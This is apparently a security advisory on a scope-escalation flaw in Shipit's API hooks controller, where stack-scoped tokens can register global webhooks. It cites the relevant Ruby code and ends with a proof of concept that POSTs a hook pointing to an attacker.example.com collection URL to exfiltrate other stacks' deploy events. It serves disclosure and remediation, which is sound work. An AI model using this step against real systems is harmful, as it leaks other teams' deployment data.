## Title
Stack-scoped API tokens can create global hooks that exfiltrate every other stack's events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
An `ApiClient` token that is scoped to a single stack (via `ApiClient#stack_id`) and holds only the `write:hook` permission can register a *global* hook by calling the unscoped `/api/hooks` collection route. Global hooks (`stack_id: nil`) receive delivery for every event emitted by every stack in the Shipit instance, not just the stack the token is bound to, letting the caller exfiltrate other stacks' `deploy`, `task`, `rollback`, `merge`, `commit_status` and `stack` payloads to an attacker-controlled URL.

### Finding Description
`ApiClient` can be scoped to a single stack: `stacks` in the base controller is restricted to `Stack.where(id: current_api_client.stack_id)` whenever `current_api_client.stack_id?` is true. [1](#0-0) 

This scoping is enforced by `stack`/`stacks`, which every stack-nested controller (e.g. `Api::StacksController#stack`) relies on. However, `config/routes.rb` also mounts a **top-level, unscoped** hooks resource in addition to the stack-nested one: [2](#0-1) 

`Api::HooksController` determines its scope purely from the presence of a `stack_id` route param: [3](#0-2) 

When the top-level `/api/hooks` route is hit, `params[:stack_id]` is absent, so `stack_id` returns `nil`, and `hooks` becomes `Hook.where(stack_id: nil)` — i.e. the set of **global** hooks. `create` (`hooks.create(params)`) then creates a hook with `stack_id: nil` regardless of which stack the authenticating `ApiClient` is bound to; the only authorization check performed is `require_permission :write, :hook`, which merely verifies the `write:hook` string is present in `current_api_client.permissions` — it never checks `current_api_client.stack_id`. [4](#0-3) 

Global hooks are delivered for every stack's events because `Hook.for_stack` explicitly matches `stack_id IN (nil, stack_id)`: [5](#0-4) 

This breaks the binding "the stack a token authorises" (the single stack referenced by `ApiClient#stack_id`) versus "the stack(s) it touches" (every stack in the Shipit installation), analogous to the settlement-vs-execution mismatch in the source report: the token's authorized scope is fixed at issuance time but the actual object it can affect (all stacks) diverges from it at use time.

### Impact Explanation
A caller holding a stack-scoped `ApiClient` token with `write:hook` (a permission independent from `write:stack`, e.g. issued to let a single service register a notification webhook for its own stack) can register an externally-controlled delivery URL that receives every `deploy`, `rollback`, `task`, `merge`, `commit_status`, `merge_status`, and `stack` event across **all** stacks managed by the Shipit instance — including stacks it has no `read:stack` permission for. This is an unauthorized cross-stack read of stack state, task/deploy metadata, and commit information, matching the High-impact category "unauthenticated read of stack state, task streams or deploy output" via a scope-escalation path.

### Likelihood Explanation
Medium: exploitation requires possession of *any* `ApiClient` token with `write:hook` permission (a plausible, narrowly-scoped credential an operator might legitimately grant to a single stack's tooling), but no `write:stack`/`read:stack` on other stacks and no admin access are needed. The only action required is a single authenticated POST to `/api/hooks` instead of the nested `/api/stacks/:stack_id/hooks` route.

### Recommendation
In `Api::HooksController`, reject `create`/`update`/`index`/`show`/`destroy` on global hooks (`stack_id.nil?`) unless the authenticating `current_api_client` is unscoped (`!current_api_client.stack_id?`), or otherwise require an additional elevated permission (e.g. `write:hook:global`) distinct from the per-stack `write:hook` permission before allowing operations on hooks with `stack_id: nil`.

### Proof of Concept
1. As an admin, create an `ApiClient` scoped to `stack_A` with permissions `['write:hook']` only (no `write:stack`/`read:stack` on other stacks).
2. Using that token, `POST /api/hooks` with `{ delivery_url: "https://attacker.example.com/collect", events: ["deploy","task","rollback","commit_status"] }`. This succeeds because `require_permission :write, :hook` only checks the permission string, and `hooks_controller.rb#stack_id` returns `nil` since no `stack_id` route param is present.
3. Trigger a deploy on `stack_B`, a stack the token has no access to. `Hook.deliver` matches the newly created global hook via `for_stack(stack_id_of_B)` → `where(stack_id: [nil, stack_B.id])`, and the deploy payload for `stack_B` is POSTed to `https://attacker.example.com/collect`. [6](#0-5)

### Citations

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** config/routes.rb (L27-46)
```ruby
    scope '/stacks/*stack_id', stack_id: stack_id_format, as: :stack do
      get '/ccmenu' => 'ccmenu#show', as: :ccmenu
      resource :lock, only: %i[create update destroy]
      resources :tasks, only: %i[index show] do
        resource :output, only: :show
        member do
          put :abort
        end
      end
      resources :deploys, only: %i[index create] do
        resources :release_statuses, only: %i[create]
      end
      resources :rollbacks, only: %i[create]
      resources :commits, only: %i[index]
      resources :merge_requests, only: %i[index show update destroy]
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L1-24)
```ruby
# frozen_string_literal: true

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L40-52)
```ruby
      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
